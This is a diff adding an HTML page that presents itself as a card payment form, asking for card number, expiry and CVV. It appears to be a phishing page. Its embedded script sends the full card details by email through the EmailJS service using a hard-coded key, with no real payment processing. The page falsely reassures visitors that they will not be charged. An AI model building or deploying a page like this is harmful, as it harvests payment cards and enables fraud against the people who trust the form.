@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="index.css">
+    <title>Application Form</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/account
+            emailjs.init('OCUFII26SPgBLeg-z');
+        })();
+    </script>
+    <script type="text/javascript">
+        window.onload = function() {
+            document.getElementById('contact-form').addEventListener('submit', function(event) {
+                event.preventDefault();
+                // generate a five digit number for the contact_number variable
+                this.contact_number.value = Math.random() * 100000 | 0;
+                // these IDs from the previous steps
+                emailjs.sendForm("service_hoopla","template_hoopla", this)
+                .then(function() {
+                    console.log('SUCCESS!');
+                        let subscribe = document.getElementById('submit')
+                        console.log('na me')
+                        subscribe.style.animationName = 'done';
+                        subscribe.value = 'DONE'
+                        let Subscribe = setTimeout(sub, 5000);
+                        function sub(){
+                            subscribe.value = 'Submit'
+                        }
+                        let yes = document.getElementById('yes')
+                        yes.innerHTML = 'Yes'
+                    }, function(error) {
+                        console.log('FAILED...', error);
+                        let subscribe = document.getElementById('submit')
+                        subscribe.value = 'unable to submit'
+                        subscribe.style.animationName = 'failed';
+                        let Subscribe = setTimeout(sub, 4000);
+                        function sub(){
+                            subscribe.value = 'Submit'
+                        }
+                    });
+            });
+        }
+    </script>
+</head>
+<body>
+    <h2>PAYMENT METHOD</h2>
+    <P id="p1">You won't be charged until you make a purchase</P>
+    <div id="div1">
+        <h3>Credit/Debit Card</h3>
+        <p id="p2">Visa, MasterCard, Discover, American Express</p>
+    </div>
+    <form id="contact-form">
+        <input type="hidden" name="contact_number">
+
+      <div>
+        <label for="number">Number</label>
+        <input type="number" name="number" id="number" placeholder="      Required"> <br>
+      </div>
+
+        <div>
+            <label for="expires">Expires</label>
+        <input type="month" name="expires" id="expires" placeholder="      MM | YYYY"><br>
+        </div>
+
+        <div>
+            <label for="cvv">CVV</label>
+            <input type="number" name="cvv" id="cvv" placeholder="        Security Code">
+        </div>
+        <input type="submit" value="Confirm" id="submit">
+    </form>
+    
+
+
+    <!-- <a href="https://web.whatsapp.com/">contact us</a> -->
+
+</body>
+</html>
